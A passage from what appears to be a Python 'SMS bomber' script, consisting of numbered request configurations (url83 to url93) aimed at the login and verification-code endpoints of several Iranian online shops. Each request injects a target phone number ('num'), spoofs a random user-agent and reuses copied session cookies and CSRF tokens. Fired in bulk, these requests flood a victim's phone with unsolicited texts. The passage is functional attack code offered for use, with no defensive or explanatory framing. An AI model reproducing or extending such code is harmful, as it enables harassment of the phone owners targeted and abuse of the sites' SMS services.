    '_lscache_vary': '1fcf3a51f529702f8c1e2118ce2b37f5',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'ddf4dbcc-32ce-da99-8378-e28a46418872',
    'analytics_session_token': 'f574af14-1252-3130-b256-66b8d7de41f9',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_gid': 'GA1.2.251744850.1693735942',
    '_pk_ref.1.d4f4': '%5B%22%22%2C%22%22%2C1693735943%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_id.1.d4f4': 'fa2bb59a2f483e6d.1693735943.',
    '_pk_ses.1.d4f4': '1',
    '_ga_8J94RX8ZMJ': 'GS1.1.1693735941.1.1.1693735955.46.0.0',
    '_ga': 'GA1.2.988613664.1693735942',
    'sb-login': 'Ym54NmV3dWIzVm9seEQxdVJISGgwZGhPYWtxWHYwTkdDcExXbHZ4VDdXV1RKL0VEdjZSd1BOTDFpVVBVaUJGTGhXd1ZhV3R1Y1VtUGw3M3Q5T1d2ZnJMQzdnczlDc2dpNTFDS3VPMWhBMXdzV1ZjYWpBZWtvTDZyamhtSjk3bXVZdll0NjM0YlJCQ21xN3ByNmtBVnhiZldSejJkN3NIazIyMmVWRVlxRVFBREJwNFFjZEMyeGtnVWdTcGhVcS9Zd2NEc2svdHRVNW9GRjJweFNXMktlQVhINUhhTEhtNnBZVGwxS3krcCtqTjMxMzBlMTFGSHBtZ05HRmxJVUdKLzFub2ViMVlKK2liR1hZRU9PamgrT0l6NkJuSHd5NEpQb2RVSThKMkhSSmoyUXExQU5XczVkWTFnanpiS3ZYYmxTalpvbVR2cStiaVNjQ1d5R2hXeDhhTnNGaWtNdzdGYmZkZG92dUp1My9nWk9vMnVCN1BXcjlxOGRORXpCUmpU',
    'PHPSESSID': 'b2aot91jm54dhsfes3kab8p35s',
}

headers83 = {
    'authority': 'www.sarabara.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'digits_countrycode=98; _lscache_vary=1fcf3a51f529702f8c1e2118ce2b37f5; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=ddf4dbcc-32ce-da99-8378-e28a46418872; analytics_session_token=f574af14-1252-3130-b256-66b8d7de41f9; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _gid=GA1.2.251744850.1693735942; _pk_ref.1.d4f4=%5B%22%22%2C%22%22%2C1693735943%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.1.d4f4=fa2bb59a2f483e6d.1693735943.; _pk_ses.1.d4f4=1; _ga_8J94RX8ZMJ=GS1.1.1693735941.1.1.1693735955.46.0.0; _ga=GA1.2.988613664.1693735942; sb-login=Ym54NmV3dWIzVm9seEQxdVJISGgwZGhPYWtxWHYwTkdDcExXbHZ4VDdXV1RKL0VEdjZSd1BOTDFpVVBVaUJGTGhXd1ZhV3R1Y1VtUGw3M3Q5T1d2ZnJMQzdnczlDc2dpNTFDS3VPMWhBMXdzV1ZjYWpBZWtvTDZyamhtSjk3bXVZdll0NjM0YlJCQ21xN3ByNmtBVnhiZldSejJkN3NIazIyMmVWRVlxRVFBREJwNFFjZEMyeGtnVWdTcGhVcS9Zd2NEc2svdHRVNW9GRjJweFNXMktlQVhINUhhTEhtNnBZVGwxS3krcCtqTjMxMzBlMTFGSHBtZ05HRmxJVUdKLzFub2ViMVlKK2liR1hZRU9PamgrT0l6NkJuSHd5NEpQb2RVSThKMkhSSmoyUXExQU5XczVkWTFnanpiS3ZYYmxTalpvbVR2cStiaVNjQ1d5R2hXeDhhTnNGaWtNdzdGYmZkZG92dUp1My9nWk9vMnVCN1BXcjlxOGRORXpCUmpU; PHPSESSID=b2aot91jm54dhsfes3kab8p35s',
    'origin': 'https://www.sarabara.com',
    'referer': 'https://www.sarabara.com/my-account/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data83 = {
    'action': 'digits_check_mob',
    'countrycode': '+98',
    'mobileNo': num,
    'csrf': '6de7de2395',
    'login': '2',
    'username': '',
    'email': '',
    'captcha': '',
    'captcha_ses': '',
    'json': '1',
    'whatsapp': '0',
}

url84 = "https://bookland.ir/HeaderFooter/ChkCell"
cookies84 = {
    'ASP.NET_SessionId': 'evv4usslns35oumwo1xycbjn',
    '_ga_2KWBKNE5X8': 'GS1.1.1693737903.1.0.1693737903.60.0.0',
    '_ga': 'GA1.2.1904797436.1693737903',
    '_gid': 'GA1.2.1517625330.1693737903',
    '_gat_UA-221526169-1': '1',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'dae6892e-fa4c-3d46-2906-e8cfd92cbffe',
    'analytics_session_token': '0b62d475-d228-e530-1015-26c767918e85',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
}

headers84 = {
    'authority': 'bookland.ir',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json; charset=UTF-8',
    # 'cookie': 'ASP.NET_SessionId=evv4usslns35oumwo1xycbjn; _ga_2KWBKNE5X8=GS1.1.1693737903.1.0.1693737903.60.0.0; _ga=GA1.2.1904797436.1693737903; _gid=GA1.2.1517625330.1693737903; _gat_UA-221526169-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=dae6892e-fa4c-3d46-2906-e8cfd92cbffe; analytics_session_token=0b62d475-d228-e530-1015-26c767918e85; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    'origin': 'https://bookland.ir',
    'referer': 'https://bookland.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data84 = {'username':num}

url85 = "https://qazvinkharid.com/login"
cookies85 = {
    'XSRF-TOKEN': 'eyJpdiI6IlM5R3RFZEFmcTk4eEJpbEMvMHNselE9PSIsInZhbHVlIjoidVFQL1NKNFdIakwybDNpd0JUb293K0FtUHlZQ0xRcnYzeDZIdU5HZXk2cC9Rd3VXY09yM215QUQvOU41QU1ya0E1bDI2d09WMmtFSy9iSDR3b0dMQ016K3NNbFF4TGVOOXQ4YWtReTlnWmFWZWFHd3JsUlFlTEpsbWFGV2EyWXIiLCJtYWMiOiIyYThjNDAzNzdkOTRjNGRiNzA1NWVhNDEyMmU4OTM0NjAxZTUwZWI4NjRhODIyNTdjZTA2OTIwMDRjZjhhNjM5IiwidGFnIjoiIn0%3D',
    'kzoyn_khryd_session': 'eyJpdiI6ImZNUHFWajQ0MXowbzE0N2NWaFNjeGc9PSIsInZhbHVlIjoiWEVOSWdKWmlPR284eEQxK0lJWVA1bmVyNnhBQWZLbTJvMVAxYWJKTytCZk9XTDhIUXZibFlrbXlLQ2R4WVhVNFNIZGN4cTBuRXkreDYxS1NyRXlqeTY5RXlRa0czOWt3N2srdXdzQnpabDRIT21xNXhrdzNWNmZZY1kvbklkQlUiLCJtYWMiOiI5ZjNjMTYwZTU3YzAzNDFjNDljZWNlZGI3YmIwNDY1NGYwYTAyZmE2MzZmNWRmZDBhMDM2MDU0Yjk4ZGJjNjc5IiwidGFnIjoiIn0%3D',
}

headers85 = {
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryTVqs6ZfRNhFDwb5c',
    # 'Cookie': 'XSRF-TOKEN=eyJpdiI6IlM5R3RFZEFmcTk4eEJpbEMvMHNselE9PSIsInZhbHVlIjoidVFQL1NKNFdIakwybDNpd0JUb293K0FtUHlZQ0xRcnYzeDZIdU5HZXk2cC9Rd3VXY09yM215QUQvOU41QU1ya0E1bDI2d09WMmtFSy9iSDR3b0dMQ016K3NNbFF4TGVOOXQ4YWtReTlnWmFWZWFHd3JsUlFlTEpsbWFGV2EyWXIiLCJtYWMiOiIyYThjNDAzNzdkOTRjNGRiNzA1NWVhNDEyMmU4OTM0NjAxZTUwZWI4NjRhODIyNTdjZTA2OTIwMDRjZjhhNjM5IiwidGFnIjoiIn0%3D; kzoyn_khryd_session=eyJpdiI6ImZNUHFWajQ0MXowbzE0N2NWaFNjeGc9PSIsInZhbHVlIjoiWEVOSWdKWmlPR284eEQxK0lJWVA1bmVyNnhBQWZLbTJvMVAxYWJKTytCZk9XTDhIUXZibFlrbXlLQ2R4WVhVNFNIZGN4cTBuRXkreDYxS1NyRXlqeTY5RXlRa0czOWt3N2srdXdzQnpabDRIT21xNXhrdzNWNmZZY1kvbklkQlUiLCJtYWMiOiI5ZjNjMTYwZTU3YzAzNDFjNDljZWNlZGI3YmIwNDY1NGYwYTAyZmE2MzZmNWRmZDBhMDM2MDU0Yjk4ZGJjNjc5IiwidGFnIjoiIn0%3D',
    'Origin': 'https://qazvinkharid.com',
    'Referer': 'https://qazvinkharid.com/login?back=%2F',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': fake.random,
    'X-CSRF-TOKEN': '8tHKfBg53vnP8tRgALHU5KvjXI0aPRkK0RWUCIKY',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data85 = f'------WebKitFormBoundaryTVqs6ZfRNhFDwb5c\r\nContent-Disposition: form-data; name="_token"\r\n\r\n8tHKfBg53vnP8tRgALHU5KvjXI0aPRkK0RWUCIKY\r\n------WebKitFormBoundaryTVqs6ZfRNhFDwb5c\r\nContent-Disposition: form-data; name="back"\r\n\r\n/\r\n------WebKitFormBoundaryTVqs6ZfRNhFDwb5c\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n{num}\r\n------WebKitFormBoundaryTVqs6ZfRNhFDwb5c\r\nContent-Disposition: form-data; name="code"\r\n\r\n\r\n------WebKitFormBoundaryTVqs6ZfRNhFDwb5c--\r\n'


url86 = "https://mah24.com/wp-admin/admin-ajax.php"
cookies86 = {
    'chatyWidget_0': '[{"k":"v-widget","v":"2023-09-03T11:10:51.993Z"}]',
    'activechatyWidgets': '0',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'db32d45d-22df-e40f-5f8c-91dedef2cb9f',
    'analytics_session_token': '15546e7c-1310-bf31-c88d-6d9b2208b24c',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_ga': 'GA1.2.443289226.1693739454',
    '_gid': 'GA1.2.1355790169.1693739454',
    '_gat_UA-60941647-3': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_ga_070XGHSVYJ': 'GS1.2.1693739455.1.1.1693739467.48.0.0',
}

headers86 = {
    'authority': 'mah24.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'chatyWidget_0=[{"k":"v-widget","v":"2023-09-03T11:10:51.993Z"}]; activechatyWidgets=0; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=db32d45d-22df-e40f-5f8c-91dedef2cb9f; analytics_session_token=15546e7c-1310-bf31-c88d-6d9b2208b24c; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _ga=GA1.2.443289226.1693739454; _gid=GA1.2.1355790169.1693739454; _gat_UA-60941647-3=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _ga_070XGHSVYJ=GS1.2.1693739455.1.1.1693739467.48.0.0',
    'origin': 'https://mah24.com',
    'referer': 'https://mah24.com/login-register/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data86 = {
    'action': 'mreeir_send_sms',
    'mobileemail': num,
    'userisnotauser': '',
    'type': 'mobile',
    'security': '070f24dfab',
}

url87 = f"https://home.mehromah.ir/engine/ajax/controller.php?mod=auth&auth_action=sentcodeviasms&mobile={num}"

url88 = "https://www.vitrin.shop/api/v1/user/request_code"
cookies88 = {
    '_ga_BV7WW1B7H3': 'GS1.1.1693740116.1.0.1693740116.0.0.0',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '86646baa-195b-e67a-de2b-e7ccc9effabc',
    'analytics_session_token': '894efd7c-ff8b-fb8b-2536-b12e9d1dcb59',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_ga': 'GA1.2.1047291364.1693740116',
    '_gid': 'GA1.2.799808032.1693740119',
    '_gat_gtag_UA_141728751_1': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    'XSRF-TOKEN': 'eyJpdiI6IkNwUjRxcEw1bTZNQi9SRUpSNkErTUE9PSIsInZhbHVlIjoiaWRKYlRJcDBuWWpVeUNVYTVVS1RVMUhXVld1ekJiVHFSMVhrc0F0amxUa0JlSlRCcU51QWFGbEs1WmRIeTkxSzZ0Tm9BMUhIOW93VWdpUXkreDNmSlhaVndrUWdlVzZnZjZ2bjU2VXd5RFJ4WFRGcVBGSGd6N21yQkgxTkJiU2EiLCJtYWMiOiIxNmUyN2U0ZWIyY2JiZDM4N2FjNzg2NGU5NWI5N2ZhZjc3ZjBhODk3ZjZjMDI5ZWUwYzczNWFiNGUyNzEwYmRlIiwidGFnIjoiIn0%3D',
    'vitrinshop2_session': 'eyJpdiI6ImdrSlFkTjV5dHVzQjZ5emFTdGw0NGc9PSIsInZhbHVlIjoiNDc2YnBpcGxYS2xpcnJhNDMvM3UwR01ubmhQcnJBa05CMEtoNUhEUEhMRHpiRHoxcDlyTEt2aU0rL1NwS2hZQzVmWXo4MUl2YjFDdzFPQ0hvcTk0VUU3WENyMm1qV0ZPMklRZG1ncy93UldOb2d0V1JHYkRjYWhRUWRTSjI1RnIiLCJtYWMiOiI4Yjc1OWUxNDRiNDdiNDVhYTJmY2NhNWU0ODRjMzI2NTQwZWUyOWM0NmJkMDkzYmVmMjlmODQyYTJiMGU4NjUyIiwidGFnIjoiIn0%3D',
}

headers88 = {
    'authority': 'www.vitrin.shop',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    # 'cookie': '_ga_BV7WW1B7H3=GS1.1.1693740116.1.0.1693740116.0.0.0; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=86646baa-195b-e67a-de2b-e7ccc9effabc; analytics_session_token=894efd7c-ff8b-fb8b-2536-b12e9d1dcb59; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _ga=GA1.2.1047291364.1693740116; _gid=GA1.2.799808032.1693740119; _gat_gtag_UA_141728751_1=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; XSRF-TOKEN=eyJpdiI6IkNwUjRxcEw1bTZNQi9SRUpSNkErTUE9PSIsInZhbHVlIjoiaWRKYlRJcDBuWWpVeUNVYTVVS1RVMUhXVld1ekJiVHFSMVhrc0F0amxUa0JlSlRCcU51QWFGbEs1WmRIeTkxSzZ0Tm9BMUhIOW93VWdpUXkreDNmSlhaVndrUWdlVzZnZjZ2bjU2VXd5RFJ4WFRGcVBGSGd6N21yQkgxTkJiU2EiLCJtYWMiOiIxNmUyN2U0ZWIyY2JiZDM4N2FjNzg2NGU5NWI5N2ZhZjc3ZjBhODk3ZjZjMDI5ZWUwYzczNWFiNGUyNzEwYmRlIiwidGFnIjoiIn0%3D; vitrinshop2_session=eyJpdiI6ImdrSlFkTjV5dHVzQjZ5emFTdGw0NGc9PSIsInZhbHVlIjoiNDc2YnBpcGxYS2xpcnJhNDMvM3UwR01ubmhQcnJBa05CMEtoNUhEUEhMRHpiRHoxcDlyTEt2aU0rL1NwS2hZQzVmWXo4MUl2YjFDdzFPQ0hvcTk0VUU3WENyMm1qV0ZPMklRZG1ncy93UldOb2d0V1JHYkRjYWhRUWRTSjI1RnIiLCJtYWMiOiI4Yjc1OWUxNDRiNDdiNDVhYTJmY2NhNWU0ODRjMzI2NTQwZWUyOWM0NmJkMDkzYmVmMjlmODQyYTJiMGU4NjUyIiwidGFnIjoiIn0%3D',
    'origin': 'https://www.vitrin.shop',
    'referer': 'https://www.vitrin.shop/login?redirect=%252Fprofile',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'systemauthenticationcode': 'null',
    'user-agent': fake.random,
    'x-xsrf-token': 'eyJpdiI6IkNwUjRxcEw1bTZNQi9SRUpSNkErTUE9PSIsInZhbHVlIjoiaWRKYlRJcDBuWWpVeUNVYTVVS1RVMUhXVld1ekJiVHFSMVhrc0F0amxUa0JlSlRCcU51QWFGbEs1WmRIeTkxSzZ0Tm9BMUhIOW93VWdpUXkreDNmSlhaVndrUWdlVzZnZjZ2bjU2VXd5RFJ4WFRGcVBGSGd6N21yQkgxTkJiU2EiLCJtYWMiOiIxNmUyN2U0ZWIyY2JiZDM4N2FjNzg2NGU5NWI5N2ZhZjc3ZjBhODk3ZjZjMDI5ZWUwYzczNWFiNGUyNzEwYmRlIiwidGFnIjoiIn0=',
}

json_data88 = {
    'phone_number': num,
    'forgot_password': False,
}

url89 = "https://takhfifan.com/v6/api/magento/login/init"
cookies89 = {
    'fb_sign_state': 'registered',
    '_pk_ref.1.8a4e': '%5B%22%22%2C%22%22%2C1693741357%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_id.1.8a4e': '77fe0aef6f040805.1693741357.',
    '_pk_ses.1.8a4e': '1',
    '_gid': 'GA1.2.877068096.1693741357',
    '_gat': '1',
    '_gcl_au': '1.1.266785087.1693741357',
    'frontend': 'f5807a9c07034ad88c3adcc803',
    '_hjSessionUser_1375480': 'eyJpZCI6ImU4OGZkNjRkLWZkNjYtNWU4OC04YTU2LWU4ZGIxZmVlZDgzYSIsImNyZWF0ZWQiOjE2OTM3NDEzNTk3MDUsImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_1375480': '0',
    '_hjSession_1375480': 'eyJpZCI6IjdmYWViYzQxLTI5MDgtNDBmOS1hMGQ3LTFiMzA1MjhjYWJlZSIsImNyZWF0ZWQiOjE2OTM3NDEzNTk3MDgsImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '90e06c30-6de3-b71d-1f4f-eb149ec6dd2f',
    'analytics_session_token': 'db75b119-5659-e620-bae4-b2ea062dd5cc',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_ga': 'GA1.2.857979447.1693741357',
    '_gat_UA-24640799-1': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_clck': '1phmt7x|2|fep|0|1341',
    '_clsk': '1w07li1|1693741362319|1|1|z.clarity.ms/collect',
    '_hantanaUser': 'd5oyud5ix',
    '_ga_5Y9PJF19HE': 'GS1.1.1693741359.1.1.1693741380.39.0.0',
}

headers89 = {
    'authority': 'takhfifan.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    # 'cookie': 'fb_sign_state=registered; _pk_ref.1.8a4e=%5B%22%22%2C%22%22%2C1693741357%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.1.8a4e=77fe0aef6f040805.1693741357.; _pk_ses.1.8a4e=1; _gid=GA1.2.877068096.1693741357; _gat=1; _gcl_au=1.1.266785087.1693741357; frontend=f5807a9c07034ad88c3adcc803; _hjSessionUser_1375480=eyJpZCI6ImU4OGZkNjRkLWZkNjYtNWU4OC04YTU2LWU4ZGIxZmVlZDgzYSIsImNyZWF0ZWQiOjE2OTM3NDEzNTk3MDUsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_1375480=0; _hjSession_1375480=eyJpZCI6IjdmYWViYzQxLTI5MDgtNDBmOS1hMGQ3LTFiMzA1MjhjYWJlZSIsImNyZWF0ZWQiOjE2OTM3NDEzNTk3MDgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=90e06c30-6de3-b71d-1f4f-eb149ec6dd2f; analytics_session_token=db75b119-5659-e620-bae4-b2ea062dd5cc; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _ga=GA1.2.857979447.1693741357; _gat_UA-24640799-1=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _clck=1phmt7x|2|fep|0|1341; _clsk=1w07li1|1693741362319|1|1|z.clarity.ms/collect; _hantanaUser=d5oyud5ix; _ga_5Y9PJF19HE=GS1.1.1693741359.1.1.1693741380.39.0.0',
    'origin': 'https://takhfifan.com',
    'referer': 'https://takhfifan.com/offers',
    'rejectunauthorized': 'false',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-response-mode': 'full',
}

json_data89 = {
    'username': num,
}

url90 = "https://kalaoma.com/wp-admin/admin-ajax.php"
cookies90 = {
    '_lscache_vary': 'a20ea30340e794c715896a7e6c48c4ff',
    'd_user_session': '01a0051f08e35fb432a9d426e80227e69d4e49a7c90466f5ee031765943779b60cbf395cbd451266527f9dc44b856d4a8f21405da030f25f75b401bfc49b4ffc',
    'PHPSESSID': 'ea068e8e18186ef0a07ec90a29c8faf5',
}

headers90 = {
    'authority': 'kalaoma.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_lscache_vary=a20ea30340e794c715896a7e6c48c4ff; d_user_session=01a0051f08e35fb432a9d426e80227e69d4e49a7c90466f5ee031765943779b60cbf395cbd451266527f9dc44b856d4a8f21405da030f25f75b401bfc49b4ffc; PHPSESSID=ea068e8e18186ef0a07ec90a29c8faf5',
    'origin': 'https://kalaoma.com',
    'referer': 'https://kalaoma.com/?login=true&page=1&redirect_to=https%3A%2F%2Fkalaoma.com%2F',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data90 = {
    'login_digt_countrycode': '+98',
    'digits_phone': num,
    'action_type': 'phone',
    'digits_process_register': '1',
    'sms_otp': '',
    'digits_otp_field': '1',
    'digits': '1',
    'instance_id': 'fbb4bbaf54220cde9b9fd8e5a53e8abc',
    'action': 'digits_forms_ajax',
    'type': 'login',
    'digits_step_1_type': '',
    'digits_step_1_value': '',
    'digits_step_2_type': '',
    'digits_step_2_value': '',
    'digits_step_3_type': '',
    'digits_step_3_value': '',
    'digits_login_email_token': '',
    'digits_redirect_page': '//kalaoma.com/?page=1&redirect_to=https%3A%2F%2Fkalaoma.com%2F',
    'digits_form': '839201305f',
    '_wp_http_referer': '/?login=true&page=1&redirect_to=https%3A%2F%2Fkalaoma.com%2F',
    'show_force_title': '1',
    'container': 'digits_protected',
    'sub_action': 'sms_otp',
}

url91 = "https://yopshop.ir/wp-admin/admin-ajax.php"
cookies91 = {
    'bakala_show_preload': 'yes',
    '_ga': 'GA1.1.2023798036.1693742034',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'd6837a7d-cd55-0256-a20d-7a0652f58bb3',
    'analytics_session_token': 'ec7e0142-37b7-1f39-de36-03213b8b0dae',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_ga_CSKBJ2B667': 'GS1.1.1693742033.1.1.1693742064.29.0.0',
}

headers91 = {
    'authority': 'yopshop.ir',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'bakala_show_preload=yes; _ga=GA1.1.2023798036.1693742034; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=d6837a7d-cd55-0256-a20d-7a0652f58bb3; analytics_session_token=ec7e0142-37b7-1f39-de36-03213b8b0dae; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _ga_CSKBJ2B667=GS1.1.1693742033.1.1.1693742064.29.0.0',
    'origin': 'https://yopshop.ir',
    'referer': 'https://yopshop.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-csrf-token': 'b60c77e3b6',
    'x-requested-with': 'XMLHttpRequest',
}

data91 = {
    'action': 'bakala_send_code',
    'phone_email': num,
}

url92 = "https://vipshop.flowers/wp-admin/admin-ajax.php"
cookies92 = {
    'PHPSESSID': '9be378f32c19f070c32824a373dafed1',
}

headers92 = {
    'authority': 'vipshop.flowers',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=9be378f32c19f070c32824a373dafed1',
    'origin': 'https://vipshop.flowers',
    'referer': 'https://vipshop.flowers/login/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data92 = {
    'action': 'logini_first',
    'login': num,
}

url93 = "https://darmankala.com/customer/account/loginpost/"
cookies93 = {
    'PHPSESSID': 'havdmbnjqor4bmt3km1ubevnj3',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '33bd200a-66de-3e3a-ef0f-b9a978493ca3',
    'analytics_session_token': '3b44d375-b6f1-37ea-273e-05250f751553',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    'form_key': '1YdpiEYiwvXJXBth',
    'mage-cache-storage': '%7B%7D',
    'mage-cache-storage-section-invalidation': '%7B%7D',
    'mage-cache-sessid': 'true',
    '_clck': 'fbl6v7|2|fep|0|1341',
    '_gid': 'GA1.2.138190209.1693742687',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    'mage-messages': '',
    'recently_viewed_product': '%7B%7D',
    'recently_viewed_product_previous': '%7B%7D',
    'recently_compared_product': '%7B%7D',
    'recently_compared_product_previous': '%7B%7D',
    'product_data_storage': '%7B%7D',
    'form_key': '1YdpiEYiwvXJXBth',
    '_ga_C124JHH4KZ': 'GS1.1.1693742686.1.1.1693742740.0.0.0',
    '_ga': 'GA1.2.128086731.1693742686',
    '_clsk': '14bsq6u|1693742741022|3|1|t.clarity.ms/collect',
    'private_content_version': '0a6427f684abd69235ce54fc8d68247f',
}

headers93 = {
    'authority': 'darmankala.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
